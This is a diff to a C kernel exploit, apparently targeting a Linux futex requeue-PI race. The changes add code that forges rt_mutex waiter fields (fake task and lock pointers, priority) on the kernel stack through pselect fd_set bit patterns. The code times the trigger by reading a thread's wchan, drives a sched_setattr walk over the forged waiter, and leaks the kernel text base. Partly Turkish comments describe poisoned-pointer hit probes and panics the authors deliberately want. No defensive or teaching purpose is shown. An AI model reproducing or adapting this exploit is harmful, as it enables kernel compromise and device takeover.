@@ -185,6 +185,30 @@ static atomic_int slide_consume_last_sched_errno;
 static atomic_int slide_consumer_ready;
 static atomic_int slide_stack_write_window;
 static atomic_int slide_pselect_write_window;
+#if defined(O1S_EARLY_FIRE) && O1S_EARLY_FIRE
+/* TEMP-TEST: consumer early-fire <-> writer skip-reset handshake bayragi. */
+static atomic_int slide_early_fired = 0;
+#endif
+#if defined(O1S_EARLY_FIRE) && O1S_EARLY_FIRE
+/* TEMP-TEST: build'de SYNC kapali oldugu icin wchan helper'i yok; kendi
+ * okuyucumuz (slide_read_task_wchan ile ayni sozlesme: 1=ok). */
+static int slide_early_read_wchan(int tid, char *buf, size_t size) {
+  char path[64];
+  snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  if (fd < 0)
+    return 0;
+  ssize_t n = read(fd, buf, size - 1);
+  close(fd);
+  if (n <= 0)
+    return 0;
+  buf[n] = 0;
+  char *nl = strchr(buf, '\n');
+  if (nl)
+    *nl = 0;
+  return 1;
+}
+#endif
 #if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
 static atomic_int slide_pselect_last_ret;
 static atomic_int slide_pselect_last_errno;
@@ -1037,6 +1061,44 @@ RMG_RACE_INLINE void prepare_slide_pselect_fdsets(
     slide_pselect_put_waiter_word(
         in, out, ex, words_per_set, w->word, w->value, w->name);
   }
+#if defined(O1S_PI_STAMP_FIX) && O1S_PI_STAMP_FIX
+  /* TEMP-TEST v8 (corrected direction, verified 3x): out-byte b lands at
+   * waiter+(0x48-b) (NFDS=640). Partial plot: only these fds matter.
+   * lock[0x38] <- fds 72-135; task[0x30] <- fds 136-191;
+   * pi_parent[0x18] <- fds 328-383 (zero); prio[0x40] <- fds 40-63. */
+  {
+    struct { unsigned off; uint64_t val; unsigned sz; } fields[] = {
+      {0x18, 0, 8},
+      {0x20, 0, 8},
+      {0x28, 0, 8},
+      {0x30, 0, 8},
+      {0x38, 0, 8},
+      {0x40, FAKE_WAITER_PRIO, 4},
+    };
+    uint64_t taskv = fake_task, lockv = fake_lock;
+#if defined(O1S_EARLY_FIRE) && O1S_EARLY_FIRE
+    /* TEMP-TEST hit-probe: lock slotina zehirli VA bas; walk sirasinda
+     * VA=0x0badf00d... Oops = STAMP VURDU (hit+direction kaniti); temiz
+     * kosu = MISS (derinlik/yon yanlis). Panic ISTENIYOR (kanit icin). */
+    lockv = 0x0badf00d0badf00dULL;
+#endif
+    memcpy(&fields[3].val, &taskv, 8);
+    memcpy(&fields[4].val, &lockv, 8);
+    for (unsigned fi = 0; fi < sizeof(fields) / sizeof(fields[0]); fi++) {
+      for (unsigned i = 0; i < fields[fi].sz; i++) {
+        uint8_t byte = (uint8_t)(fields[fi].val >> (8 * i));
+        unsigned b = 0x48 - (fields[fi].off + i);
+        for (unsigned j = 0; j < 8; j++) {
+          if (byte & (1u << j)) {
+            unsigned fd = 8 * b + j;
+            if (fd < (unsigned)slide_route_nfds)
+              FD_SET((int)fd, out);
+          }
+        }
+      }
+    }
+  }
+#endif
 }
 
 RMG_RACE_INLINE void open_slide_selected_fds(
@@ -1135,7 +1197,14 @@ RMG_RACE_INLINE void slide_pselect_stack_copy(void) {
   prepare_slide_pselect_fdsets(&in, &out, &ex);
   open_slide_selected_fds(&in, &out, &ex, high_read);
 
+#if defined(O1S_EARLY_FIRE) && O1S_EARLY_FIRE
+  /* TEMP-TEST: early-fire ayni attempt'te stamp+walk'i yaptiysa onun
+   * sched_ok muhasebesini koru (consume-once flag = per-attempt reset). */
+  if (atomic_exchange(&slide_early_fired, 0) == 0)
+    slide_reset_consume_state();
+#else
   slide_reset_consume_state();
+#endif
 
   struct timespec timeout = {
 #ifdef SLIDE_PSELECT_TIMEOUT_NSEC
@@ -1232,6 +1301,72 @@ RMG_RACE_INLINE void slide_pselect_stack_copy(void) {
   }
   close(pipefd[0]);
   close(pipefd[1]);
+}
+#endif /* !defined(SLIDE_STACK_WRITER) */
+
+#if defined(O1S_EARLY_FIRE) && O1S_EARLY_FIRE
+/* TEMP-TEST early-stamp (slide_pselect_stack_copy'nin handshake'siz kopyasi):
+ * go/stop/reset atomiklerine DOKUNMAZ; sadece fd-pstudy + pselect(100ms).
+ * Consumer tarafindan PI-block penceresi icinde cagrilir. */
+
+static int slide_pselect_early_stamp(int *errno_out) {
+  if (!page_base || !fake_lock || !fake_w0) {
+    pr_error("slide early-stamp missing base=%016zx lock=%016zx w0=%016zx\n",
+             page_base, fake_lock, fake_w0);
+    if (errno_out)
+      *errno_out = ENXIO;
+    return -1;
+  }
+  int pipefd[2] = {-1, -1};
+  if (pipe(pipefd) != 0) {
+    if (errno_out)
+      *errno_out = errno;
+    return -1;
+  }
+  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
+  if (block_fd < 0)
+    block_fd = pipefd[0];
+  int high_read = fcntl(block_fd, F_DUPFD, slide_route_nfds + 16);
+  if (high_read < 0) {
+    int e = errno;
+    if (block_fd != pipefd[0])
+      close(block_fd);
+    close(pipefd[0]);
+    close(pipefd[1]);
+    if (errno_out)
+      *errno_out = e;
+    return -1;
+  }
+  fd_set in;
+  fd_set out;
+  fd_set ex;
+  prepare_slide_pselect_fdsets(&in, &out, &ex);
+  open_slide_selected_fds(&in, &out, &ex, high_read);
+  struct timespec timeout = {
+#ifdef SLIDE_PSELECT_TIMEOUT_NSEC
+    .tv_sec = 0,
+    .tv_nsec = SLIDE_PSELECT_TIMEOUT_NSEC,
+#else
+    .tv_sec = PSELECT_TIMEOUT_SEC,
+    .tv_nsec = 0,
+#endif
+  };
+  size_t t0 = gettime_ns();
+  errno = 0;
+  int ret = (int)syscall(SYS_pselect6, slide_route_nfds,
+                         &in, &out, &ex, &timeout, NULL);
+  int e = errno;
+  size_t el = (gettime_ns() - t0) / 1000ULL;
+  pr_info_sync("slide early-stamp pselect ret=%d errno=%d elapsed_usec=%zu\n",
+               ret, e, el);
+  close(high_read);
+  if (block_fd != pipefd[0])
+    close(block_fd);
+  close(pipefd[0]);
+  close(pipefd[1]);
+  if (errno_out)
+    *errno_out = e;
+  return ret;
 }
 #endif
 
@@ -2311,6 +2446,53 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
 
   int seen = 0;
   for (;;) {
+#if defined(O1S_EARLY_FIRE) && O1S_EARLY_FIRE
+    /* TEMP-TEST early-fire: waiter PI-block penceresindeyken (deadlock_seen
+     * + wchan=futex_wait_queue_me, henuz timeout-OK yok) stamp+walk yap;
+     * post-timeout stale-FIRE'i tamamen atla (reboot yok, attempt devam). */
+    {
+      int _dl = atomic_load(&slide_deadlock_seen);
+      int _wok = atomic_load(&slide_waiter_ok);
+      if (!_wok && _dl) {
+        int _wt = atomic_load(&slide_waiter_tid);
+        char _wch[64] = {0};
+        if (_wt > 0 && slide_early_read_wchan(_wt, _wch, sizeof(_wch)) == 1 &&
+            strncmp(_wch, "futex_wait_queue_me",
+                    sizeof("futex_wait_queue_me") - 1) == 0) {
+          int _serrno = 0;
+          pr_info_sync("slide early-fire stamp tid=%d wchan=%s\n",
+                       _wt, _wch);
+          (void)slide_pselect_early_stamp(&_serrno);
+          char _wch2[64] = {0};
+          int _still =
+              (_wt > 0 &&
+               slide_early_read_wchan(_wt, _wch2, sizeof(_wch2)) == 1 &&
+               strncmp(_wch2, "futex_wait_queue_me",
+                       sizeof("futex_wait_queue_me") - 1) == 0);
+          pr_info_sync("slide early-fire walk tid=%d still=%d wchan=%s\n",
+                       _wt, _still, _wch2);
+          *errno_ptr = 0;
+          long _ret = _still ? sched_setattr_tid(_wt, 1) : -1L;
+          int _se = _still ? *errno_ptr : ECANCELED;
+          atomic_store(&slide_consume_last_sched_ret, (int)_ret);
+          atomic_store(&slide_consume_last_sched_errno, _se);
+          if (_ret == 0) {
+            int _ok = atomic_load(&slide_consume_sched_ok) + 1;
+            atomic_store(&slide_consume_sched_ok, _ok);
+          }
+          atomic_store(&slide_early_fired, 1);
+          atomic_store(&slide_consume_stop, 1);
+          pr_info_sync("slide early-fire done ret=%ld errno=%d\n",
+                       _ret, _se);
+          return NULL;
+        }
+      } else if (_wok) {
+        pr_info_sync("slide early-fire missed (post-timeout); stale walk "
+                     "skipped\n");
+        return NULL;
+      }
+    }
+#endif
     int seq = atomic_load(&slide_consume_go);
     if (seq == 0 || seq == seen) {
       __asm__ volatile("yield" ::: "memory");
@@ -2327,6 +2509,28 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       atomic_store(&slide_consume_lost, lost);
       continue;
     }
+#if defined(O1S_NO_CHILD_CONSUME)
+    /* Fire only if the waiter tid belongs to THIS process (probe own
+     * tasks, at fire time when waiter_tid is set). Forked children
+     * (trigger/leak helpers) inherit a stale waiter_tid pointing at the
+     * parent's waiter; walking it panics first and reboots before the
+     * parent completes. Skip this fire (not return: keep loop alive). */
+    {
+      int _wt = atomic_load(&slide_waiter_tid);
+      int _found = 0;
+      if (_wt > 0) {
+        char _pb[64];
+        snprintf(_pb, sizeof(_pb), "/proc/self/task/%d", _wt);
+        int _pfd = syscall(SYS_openat, AT_FDCWD, _pb, O_RDONLY | O_CLOEXEC, 0);
+        if (_pfd >= 0) {
+          _found = 1;
+          syscall(SYS_close, _pfd);
+        }
+      }
+      if (!_found)
+        continue;
+    }
+#endif
 
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
     int tid = atomic_load(&slide_waiter_tid);
@@ -2449,8 +2653,9 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
     int saved_errno = ECANCELED;
     pr_info("slide measure skip sched_setattr tid=%d calls=%d\n", tid, calls);
 #else
-    pr_info_sync("slide consume FIRE tid=%d seq=%d calls=%d go=%d\n", tid,
-                 seq, calls, atomic_load(&slide_consume_go));
+    pr_info_sync("slide consume FIRE tid=%d seq=%d calls=%d go=%d self=%d pid=%d\n", tid,
+                 seq, calls, atomic_load(&slide_consume_go),
+                 (int)syscall(SYS_gettid), (int)getpid());
     long ret = sched_setattr_tid(tid, (calls % 19) + 1);
     int saved_errno = *errno_ptr;
 #endif
@@ -2489,6 +2694,17 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
     pr_error("slide waiter lock chain errno=%d\n", errno);
     return NULL;
   }
+#if defined(O1S_EARLY_FIRE) && O1S_EARLY_FIRE
+  /* TEMP-TEST residue-primer: waiter KENDI kernel-stack'inde pselect fdset
+   * kalintisi birakip SONRA bloklanir; PI-waiter struct kalintiyla ortusur.
+   * (Post-wake/consumer pselect'leri baska stack/zamanda -> ise yaramaz.) */
+  {
+    int _perr = 0;
+    int _pret = slide_pselect_early_stamp(&_perr);
+    pr_info_sync("slide waiter primer pselect ret=%d errno=%d tid=%d\n",
+                 _pret, _perr, tid);
+  }
+#endif
 
   atomic_store(&slide_waiter_ready, 1);
   while (!atomic_load(&slide_owner_started)) {
@@ -2511,14 +2727,16 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   slide_sigreturn_arm_waiter();
   slide_sigreturn_fill_payload();
 #endif
-  pr_info("slide waiter-block t=%llu tid=%d\n",
-          (unsigned long long)gettime_ns(), tid);
+  pr_info("slide waiter-block t=%llu tid=%d pid=%d\n",
+          (unsigned long long)gettime_ns(), tid, (int)getpid());
   errno = 0;
+  uint64_t block_t = gettime_ns();
   long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                            &slide_f_pi_target, 0);
   int wait_errno = errno;
-  pr_info("slide waiter-wake t=%llu ret=%ld errno=%d\n",
-          (unsigned long long)gettime_ns(), wait_ret, wait_errno);
+  pr_info("slide waiter-wake t=%llu ret=%ld errno=%d blocked_ms=%llu\n",
+          (unsigned long long)gettime_ns(), wait_ret, wait_errno,
+          (unsigned long long)(gettime_ns() - block_t) / 1000000ULL);
 #if !(defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE)
   pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno);
 #endif
@@ -2531,16 +2749,7 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   while (!atomic_load(&slide_deadlock_seen)) {
     __asm__ volatile("yield" ::: "memory");
   }
-  pr_info("slide pi stage=waiter-unlock-enter tid=%d\n", tid);
-  if (futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
-    pr_error("slide waiter unlock chain errno=%d\n", errno);
-    atomic_store(&slide_route_done, 1);
-    return NULL;
-  }
-  pr_info("slide pi stage=waiter-unlock-return tid=%d\n", tid);
-  while (!atomic_load(&slide_owner_acquired)) {
-    __asm__ volatile("yield" ::: "memory");
-  }
+  /* TEMP-TEST (writer-before-unlock): stamp + consumer-fire while entangled. */
   pr_info_sync("slide pi stage=writer-enter tid=%d\n", tid);
 
 #if defined(SLIDE_STACK_WRITER) && \
@@ -2563,6 +2772,16 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   pr_info("slide pi stage=writer-return tid=%d sched_ok=%d window=%d\n",
           tid, atomic_load(&slide_consume_sched_ok),
           atomic_load(&slide_stack_write_window));
+  pr_info("slide pi stage=writer-unlock-enter tid=%d\n", tid);
+  if (futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
+    pr_error("slide waiter unlock chain errno=%d\n", errno);
+    atomic_store(&slide_route_done, 1);
+    return NULL;
+  }
+  pr_info("slide pi stage=writer-unlock-return tid=%d\n", tid);
+  while (!atomic_load(&slide_owner_acquired)) {
+    __asm__ volatile("yield" ::: "memory");
+  }
   atomic_store(&slide_route_done, 1);
 
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
@@ -2731,18 +2950,19 @@ uint64_t slide_child_leak_stext(void) {
       pr_info("slide cmp_requeue_pi poll=%d ret=%ld errno=%d\n",
               requeue_polls, requeue_ret, requeue_errno);
     }
-    if (requeue_ret != 0) {
+    /* TEMP-TEST (primer gecikmesi): waiter primer-pselect yuzunden gec
+     * kuyruga girer; ilk poll EAGAIN normaldir -> RETRY (break yok). */
+    if (requeue_ret != 0 &&
+        !(requeue_ret == -1 && requeue_errno == EAGAIN)) {
       break;
     }
     if (requeue_polls < SLIDE_REQUEUE_MAX_POLLS) {
       usleep(SLIDE_REQUEUE_POLL_USEC);
     }
   }
-  pr_info("slide cmp_requeue_pi ret=%ld errno=%d polls=%d\n",
+  /* TEMP-TEST: mainroute CMP outcome (EDEADLK=35 success vs EAGAIN=11). */
+  pr_info_sync("slide main-cmp ret=%ld errno=%d polls=%d\n",
           requeue_ret, requeue_errno, requeue_polls);
-  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
-    return 0;
-  }
   atomic_store(&slide_deadlock_seen, 1);
 
   while (!atomic_load(&slide_route_done)) {
@@ -2755,11 +2975,19 @@ uint64_t slide_child_leak_stext(void) {
   return slide_read_stext();
 }
 
+/* TEMP-TEST: child-consume kill-switch (unconditional def; set only by
+ * slide children when O1S_NO_CHILD_CONSUME). */
+int slide_in_child_no_consume = 0;
+
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+
 static int slide_child_trigger_write(void) {
   pthread_t waiter;
   pthread_t owner;
   pthread_t consumer;
+#if defined(O1S_NO_CHILD_CONSUME)
+  slide_in_child_no_consume = 1;
+#endif
   SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
